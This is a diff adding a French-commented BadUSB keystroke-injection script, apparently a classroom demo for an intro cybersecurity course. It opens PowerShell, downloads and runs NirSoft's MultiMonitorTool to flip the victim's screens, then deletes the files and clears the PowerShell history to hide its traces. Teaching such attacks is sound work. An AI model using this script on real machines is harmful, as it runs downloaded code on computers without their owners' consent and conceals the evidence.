@@ -1,0 +1,40 @@
+REM #############################################################
+REM #                                                           #
+REM # Démo BadUSB pour le cours 3U4 intro à la cybersécurité    #
+REM # ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯    #
+REM # Ce script démarre PowerShell et télécharge l'outil        #
+REM # multimonitortool de NirSoft, puis utilise cet outil pour  #
+REM # inverser l'orientation des 2 premiers moniteurs           #
+REM # puis efface ses traces.                                   #
+REM #                                                           #
+REM # Auteur       : Vincent Carrier, CÉGEP Édouard-Montpetit   #
+REM # Version      : 2.1                                        #
+REM #                                                           #
+REM #############################################################
+
+
+REM Les touches WIN+R ouvrent la commande Exécuter
+GUI r
+DELAY 500
+
+REM Démarrage d'une fenêtre PowerShell
+ALTSTRING powershell
+ENTER
+DELAY 1000
+
+REM Téléchargement du programme
+ALTSTRING iwr https://www.nirsoft.net/utils/multimonitortool-x64.zip -out a.zip;
+
+REM Extraction du programme
+ALTSTRING expand-archive a.zip;
+
+REM Exécution de l'attaque
+ALTSTRING 1..4|%{saps .\a\multimonitortool.exe "/setorientation $_ 180" -wait};
+
+REM Nettoyage
+ALTSTRING remove-item a.zip,.\a -recurse -force;
+ALTSTRING clc (get-psreadlineoption).historysavepath;
+ALTSTRING exit
+
+REM Exécution du script
+ENTER
